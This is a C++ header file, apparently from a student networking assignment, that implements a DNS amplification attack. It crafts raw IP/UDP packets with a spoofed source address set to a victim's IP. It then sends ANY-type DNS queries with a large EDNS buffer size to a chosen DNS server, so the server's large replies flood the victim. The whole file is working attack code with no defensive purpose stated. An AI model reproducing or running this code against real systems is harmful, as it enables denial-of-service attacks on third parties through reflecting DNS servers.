#ifndef DNS_ATTACK_INCLUDED
#define DNS_ATTACK_INCLUDED

#include "misc.h"
#include <cstring>
#include <string>
#include <iostream>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

class dns_attack {
private:
	std::string Victim_IP, Server_IP;
	int Source_Port;
	size_t setDNSPayload(const char*, uint16_t, uint8_t*);
public:
	void attack();
	dns_attack();
	dns_attack(std::string Victim_IP, int Source_Port, std::string Server_IP) : Victim_IP(Victim_IP), Server_IP(Server_IP), Source_Port(Source_Port) {};
};


dns_attack::dns_attack() {
	Source_Port = 0;
	Victim_IP = "";
	Server_IP = "";
}

/* Set up DNS header, question */
/* Given queried hostname, QTYPE, and the pointer of packet */
/* Return the size of DNS payload */
size_t dns_attack::setDNSPayload(const char* hostname, uint16_t dns_type, uint8_t* packet) {
	struct dns_header {
		uint16_t xid;      /* Randomly chosen identifier */
		uint16_t flags;    /* Bit-mask to indicate request/response */
		uint16_t qdcount;  /* Number of questions */
		uint16_t ancount;  /* Number of answers */
		uint16_t nscount;  /* Number of authority records */
		uint16_t arcount;  /* Number of additional records */
	};
	
	char* name = (char *) (packet + sizeof(dns_header));

	struct dns_question {
		uint16_t dnstype;  /* The QTYPE (1 = A) */
		uint16_t dnsclass; /* The QCLASS (1 = IN) */
	};

	struct dns_opt_rr {
		uint8_t name;
		uint16_t type;      //  OPT (41)
		uint16_t opt_class; //  requestor's UDP payload size
		uint32_t ttl;
		uint16_t rdlen;
	} __attribute__((packed));

	size_t tot_len = 0;

	/* Set up the DNS header */
	dns_header* header = (dns_header *) (packet);
	memset(header, 0, sizeof(dns_header));

	header->xid= htons(0x9A4D);    /* Randomly chosen ID; 9A4D: Jun-Hong 9A21: YojaHuang*/
	header->flags = htons(0x0100); /* Q=0, RD=1 */
	header->qdcount = htons(1);    /* Sending 1 question */
	header->arcount = htons(1);    /* 1 additional record */

	tot_len += sizeof(dns_header);

	/* DNS name format requires two bytes more than the length of the domain name as a string */
	/* Leave the first byte blank for the first field length */
	memcpy(name + 1, hostname, strlen(hostname));
	uint8_t *prev = (uint8_t *) name;
	uint8_t count = 0; /* Used to count the bytes in a field */
	
	/* Traverse through the name, looking for the . locations */
	for (size_t i = 0; i < strlen(hostname); i++) {
		/* A . indicates the end of a field */
		if (hostname[i] == '.') {
			/* Copy the length to the byte before this field, then update prev to the location of the . */
			*prev = count;
			prev = (uint8_t *)(name + i + 1);
			count = 0;
		}
		else
			++count;
	}
	*prev = count;

	tot_len += strlen(hostname) + 2;
	
	/* Set QTYPE, QCLASS */
	dns_question* question = (dns_question*) (packet + tot_len);
	question->dnstype = htons(dns_type);
	question->dnsclass = htons(1); /* QCLASS 1=IN */
	
	tot_len += sizeof(dns_question);
	
	/* Set OPT(EDNS) */
	dns_opt_rr* opt_rr = (dns_opt_rr*) (packet + tot_len);
	memset(opt_rr, 0, sizeof(dns_opt_rr));
	opt_rr->type = htons(41);
	opt_rr->opt_class = htons(4095);
	
	tot_len += sizeof(dns_opt_rr);

	return tot_len;
}


void dns_attack::attack() {
	int sockfd = Socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	{
		std::cout << "Set up socket option........." << std::endl;
		int one = 1;
		Setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int));
		std::cout << "Success!" << std::endl;
	}

	char buffer[16384];
	memset(buffer, 0, sizeof(buffer));
	
	/* DNS payload */
	uint8_t *packet = (uint8_t *) (buffer + sizeof(struct iphdr) + sizeof(struct udphdr));
	size_t packetlen = setDNSPayload("cpsc.gov", 255, packet); // "cpsc.gov", "u.nu", "nycu.me"; /* QTYPE 1=A 255=ANY 16=TXT */
	
	/* Debug */
	std::cout << Victim_IP << ' ' << Source_Port << ' ' << Server_IP << std::endl;
	std::cout << sizeof(struct iphdr) << ' ' << sizeof(struct udphdr) << ' ' << packetlen << std::endl;
	
	/* Setup ip, udp header */
	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
	
	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 16; // Low delay
	ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + packetlen; // Add the size of DNS payload later.
	ip->id = htons(30678);
	ip->ttl = 64; // hops
	ip->protocol = 17; // UDP
	ip->saddr = inet_addr(Victim_IP.c_str());
	ip->daddr = inet_addr(Server_IP.c_str());

	udp->source = htons(Source_Port);
	udp->dest = htons(53); // dns port number
	udp->len = htons(sizeof(struct udphdr) + packetlen);
	
	/* Calculate Checksum */
	ip->check = getCheckSum((unsigned short *)buffer, (sizeof(struct iphdr)) / 2);
	// udp->check = getCheckSum((unsigned short *)buffer + sizeof(struct iphdr), (sizeof(struct udphdr) + packetlen) / 2);
	udp->check = 0;

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(53);
	sin.sin_addr.s_addr = inet_addr(Server_IP.c_str());

	if (sendto(sockfd, buffer, ip->tot_len, 0,
	(struct sockaddr *)&sin, sizeof(sin)) < 0)
	{
		perror("sendto()");
		exit(3);
	}
	printf("OK: one packet is sent.\n");

	Close(sockfd);
}


#endif
